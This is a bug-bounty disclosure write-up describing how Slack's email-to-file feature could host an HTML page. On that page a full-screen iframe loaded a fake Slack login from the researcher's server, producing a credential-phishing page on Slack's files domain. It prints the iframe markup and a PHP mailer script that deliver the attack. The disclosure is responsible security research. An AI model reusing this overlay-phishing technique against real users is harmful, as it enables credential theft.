---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-07-15_500-bounty-man-in-the-middle-on-slack.md
original_filename: 2019-07-15_500-bounty-man-in-the-middle-on-slack.md
title: '500$ bounty: Man in the Middle on Slack'
category: documents
detected_topics:
- xss
- access-control
- command-injection
- file-upload
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- access-control
- command-injection
- file-upload
- automation-abuse
- api-security
language: en
raw_sha256: c83556a6ea93c2fb4d498c72365cd6b74aa1547799a25d2d08e86c0cd98ae63b
text_sha256: 60a3d7301c9182f9dbfea96b04611dadb0b05d283af6fda2035d63ead7f9efea
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# 500$ bounty: Man in the Middle on Slack

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-07-15_500-bounty-man-in-the-middle-on-slack.md
- Source Type: markdown
- Detected Topics: xss, access-control, command-injection, file-upload, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `c83556a6ea93c2fb4d498c72365cd6b74aa1547799a25d2d08e86c0cd98ae63b`
- Text SHA256: `60a3d7301c9182f9dbfea96b04611dadb0b05d283af6fda2035d63ead7f9efea`


## Content

---
title: "500$ bounty: Man in the Middle on Slack"
page_title: "500$ bounty: Man in the Middle on Slack | Sysrant"
url: "https://sysrant.com/500-bounty-man-in-the-middle-on-slack/"
final_url: "https://sysrant.com/500-bounty-man-in-the-middle-on-slack/"
authors: ["Wiard van Rij / Sysrant (@RijWiard)"]
programs: ["Slack"]
bugs: ["MiTM"]
bounty: "500"
publication_date: "2019-07-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5148
---

# 500$ bounty: Man in the Middle on Slack

Jul 15, 2019 · 11 min read · [bug bounty ](https://sysrant.com/tags/bug-bounty/ "bug bounty")[MiTM ](https://sysrant.com/tags/mitm/ "MiTM")[Slack ](https://sysrant.com/tags/slack/ "Slack") · 

Share on: [ ](https://twitter.com/intent/tweet?text=500%24%20bounty%3a%20Man%20in%20the%20Middle%20on%20Slack&url=https%3a%2f%2fsysrant.com%2f500-bounty-man-in-the-middle-on-slack%2f&tw_p=tweetbutton "Share on Twitter") [ ](https://www.facebook.com/sharer.php?u=https%3a%2f%2fsysrant.com%2f500-bounty-man-in-the-middle-on-slack%2f&t=500%24%20bounty%3a%20Man%20in%20the%20Middle%20on%20Slack "Share on Facebook") [ ](https://sysrant.com/500-bounty-man-in-the-middle-on-slack/ "Copy Link")

I wanted to disclose a security issue/concern which I found a while ago on Slack in a blog post. The issue itself is not very technical on itself. This makes it cool to share it with a somewhat broader public. Hopefully to create more awareness about security in general. Besides that, I hope people will start using bug-bounty programs more often. Either by signing up on programs such as HackerOne with their company or by just trying to hack in one of the programs there ;)

## Slack?

Just a small intro for those who don't know Slack (shame on you :D).

> Slack is a collaboration hub where you and your team can work together to get things done. From project kickoffs to budget discussions, and to everything in between — Slack has you covered. > > https://get.slack.help/hc/en-us/articles/115004071768-What-is-Slack-

IMO the better version is: It is a chat application used by a huge number of companies (especially in the IT) which also allows you to post Giphy's with a bot. Just check it out for yourself.

![What is slack](/500-bounty-man-in-the-middle-on-slack/what-is-slack.png)

## Discovery phase

Since I've been using Slack for years I was eager to discover it further. "Hopefully" being able to find a security issue/flaw. I was especially interested in how data was handled. Obviously, you have the chat, people can post text. The scope is pretty easy and I went to explore further; uploads. Users can upload whatever they want to share within a channel or via PM. It gets uploaded to Slack and is viewable in various ways. Either by a preview in the channel itself or on an actual URL at Slack. This makes it more interesting for 2 big reasons.

### 1: Processing data is hard

When you allow every filetype and upload it to your systems, you are going to have a bad time in general. You cannot trust an extension such as .png or .jpg. One can alter the actual file, inject bad stuff, trick your system, etc. I will just quote this from OWASP, it might be overkill on information, but you'll get the point:

  * The impact of this vulnerability is high, the supposed code can be executed in the server context or on the client side. The likelihood of detection for the attacker is high. The prevalence is common. As a result, the severity of this type of vulnerability is high.
  * It is important to check a file upload module's access controls to examine the risks properly.
  * Server-side attacks: The web server can be compromised by uploading and executing a web-shell which can run commands, browse system files, browse local resources, attack other servers, or exploit the local vulnerabilities, and so forth.
  * Client-side attacks: Uploading malicious files can make the website vulnerable to client-side attacks such as XSS or Cross-site Content Hijacking.
  * Uploaded files can be abused to exploit other vulnerable sections of an application when a file on the same or a trusted server is needed (can again lead to client-side or server-side attacks)
  * Uploaded files might trigger vulnerabilities in broken libraries/applications on the client side (e.g. iPhone MobileSafari LibTIFF Buffer Overflow).
  * Uploaded files might trigger vulnerabilities in broken libraries/applications on the server side (e.g. ImageMagick flaw that called ImageTragick!). * Uploaded files might trigger vulnerabilities in broken real-time monitoring tools (e.g. Symantec antivirus exploit by unpacking a RAR file)
  * A malicious file such as a Unix shell script, a windows virus, an Excel file with a dangerous formula, or a reverse shell can be uploaded on the server in order to execute code by an administrator or webmaster later -- on the victim's machine.
  * An attacker might be able to put a phishing page into the website or deface the website.
  * The file storage server might be abused to host troublesome files including malware, illegal software, or adult contents. Uploaded files might also contain malware command and control data, violence and harassment messages, or steganographic data that can be used by criminal organizations.
  * Uploaded sensitive files might be accessible by unauthorized people. * File uploaders may disclose internal information such as server internal paths in their error messages.

There is just no sane way to check uploads. One could be in more control when you can define much harder what type of files you allow. It is not perse about the upload but on how you deal with the data. To explain this a little more an example. If I was able to upload a malicious .php file I require 2 more things:

  * I need to be able to access this file in order to execute it
  * It should be executable by the server, in order to actually be able to execute it.

Thus what I'm trying to say is that the file itself can be uploaded perfectly without any consequences. It's eventually about how you serve and process it for it to become an actually exploit. Both steps in the process are equality important. I'm absolutely not saying you should ignore the upload progress itself and/or not sanitise/escape user-input.

### 2: Serving the data

So if I allow images, I could

  * Try my best to identify the file. Check the extension, read headers, meta-data, inspect the raw data, etc.
  * Move the file to a totally new random file with the fixed extension. So even if you upload a badfile.wtf file **and** you bypass any checks, it still gets "listed" as 10293812903.png. This makes the attack vector much harder, if not impossible.
  * Place it in a place where it cannot be executed by the server itself.
  * Deliver it in a way that even tampering it does not result in weird behavior. This mostly means that if I include the image in an  HTML tag, I escape it properly and make sure it cannot go "out of scope".

Never say never, but methods as such make it really hard if not impossible to be exploitable. Because I'm in control.

## Attack vector

So back to Slack, I noticed that depending on the type of data, Slack always tries to serve you the file. If I upload a movie I do get a player, if it's an image, it will display the image. The same goes for HTML to some extend. Not perse in the actual client itself but you can do more with your data:

![data options](/500-bounty-man-in-the-middle-on-slack/dataoptions.png)

When I open the original I get my "data", this is an actual webpage with my information displayed. An image simply can get a .jpg. Yet an HTML gets included as well. Basically, if I upload a plain HTML file, it will get rendered. This again makes it very interesting to see what we can do with it.

## Abusing it

If we can render an HTML page, we might have some options to use JS or load remote resources. Yet when I checked this it was impossible to load remote resources because of the content security policy. The same goes for inline JS. So this was good from Slack but limited my options for any exploitation.

After trying various options I did notice that I was allowed to include a remote page via an iframe. What you can do is insert the iframe element and load a page into that element. So it's not actually "living" inside the webpage, but more as a "containerized" element which has no access to its "parent" page.

The bad thing about iframes (I mean, they are always bad...but hey) is that with the proper style you can mask the iframe. This way it looks like any ordinary webpage, yet it is the content from the iframe. So I crafted an HTML page:
  
  
  1<html>
  2<body>
  3
  4<iframe src="https://wiard.nl/test.php" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
  5</iframe>
  6</body>
  7</html>

`

It removes the scrolling bars, stretch it entirely over the whole page and place itself on top. Whatever I place on my own server (the test.php) will get rendered in the Slack "preview" page.

## Man in the Middle

I want to create a proof-of-concept in a way that shows that we can abuse something. With the ability to create my own content a man in the middle attack seems viable. The goal is to either trick the user in "using" my page so that I can read/steal something. The man in the middle.

To improve my chances I was figuring out how to manipulate the URL of my data. When you upload a file it mostly gets an URL like `files.slack.com/files-pri/T2RJU2CNR-F8YSYRH1A/something-random-title`

I wanted to be able to alter that "something-random-title". I noticed that depending on the title of the file it sometimes added a few letters from the title, but it still looked weird.

Then I discovered a feature in which you receive a random Slack e-mail address. Any mail sent to this address gets posted in a private DM on Slack. The title of the e-mail was the actual title it would use on Slack files. Bingo.

![email-slack](/500-bounty-man-in-the-middle-on-slack/email-slack.png)

The option

## The "payload"
  
  
  
  
  
  1  <?php
  2
  3  $to = '[[email protected]](/cdn-cgi/l/email-protection)';
  4  $subject = 'Login';
  5  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
  6  $message = '
  7
  8  <html>
  9  <body>
  10
  11  <iframe src="https://wiard.nl/test.php" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
  12  </iframe>
  13  </body>
  14  </html>
  15
  16  ';
  17
  18  mail($to, $subject, $message, $headers);
  19  
  

`

Some simple PHP script to make it a bit easier. I sent this e-mail to my Slack e-mail address, added the content-type text/html headers so it would render my HTML and included the iframe.

What was left was to create something in my PHP script. I simply copy/pasted the HTML from the official Slack login page and placed it in my own PHP script.

## The result

What I have now was a page on the Slack files domain, with an URL ending in "login", with an actual login page. Yet any data you would input would be sent to me. Not to Slack.

Full PoC that I have sent over to Slack:

_fyi, that server, webpage and e-mail does not exist anymore ;) _

**So the simple tl;dr:**

I created an HTML page which included an iframe to my own website which hosted a fake login page. I sent this HTML page to my Slack e-mail which uploaded the data to Slack. With the e-mail title, I was able to craft the URL having a /login, making it more believable. If someone would log in via that page, I would have gained his credentials.

## Reporting it

_**Just be aware, I was already a member of HackerOne and I checked the scope in which you allowed "to do things" for the Slack program. If you ever feel like starting with hacking, please do read the scopes. This work always falls in a grey area and without proper consent, you can end up with actual legal issues in general. **_

I made the PoC and Slack eventually confirmed this. When they initially tried to reproduce my PoC they forgot the text/html header. Eventually, I got the message: "we've triaged this issue". Which was great for me, since they do give bounties ;)

A few days ago they have fixed this issue and now I'm able to disclose it. Personally, I really love Slack for having such a program. It allows their product to be more secure while enabling people to research in a safe manner. The only downside was that I made this report nearly 12 months ago. I did get my bounty (500$) much earlier though. I do believe they have changed a few things internally to make this process better.

I also want to thank Max from Slack for his efforts in communication and processing. After I pointed out that I wanted more information/timeline, he did step-up to help me out. So, thanks again for that.

## Contributing yourself

Every time I post something about security I try to get more people involved. If you have influence in your company I would recommend checking out various bug bounty programs such as HackerOne (I'm not affiliated by them by the way..). The reason is that you gain access to a huge community of hackers who know their things. I strongly believe it provides a huge amount of input to secure your application(s) on top of your (hopefully) periodically pen-tests. If you do believe this is a to big step to take, at least implement a disclosure policy. This allows you to be passive. You don't take such active part in security but it allows people to securely report issues they might have found on your own terms.

For those with some affinity in the IT, I would also recommend to check out some programs to take part in. Obviously, I enjoy it myself. I see it as a technical puzzle with the occasional payouts. Yet it can provide you so much more insights for your own work. I was a developer myself and by joining the red team (attacking side) I was able to build much more secure applications than I did before. Just sign up and read the scopes of each program on what you may or may not do within an application. If you ever want help, feel free to contact me on Linkedin or something, you'll find me somewhere.

[comments powered by Disqus](https://disqus.com)
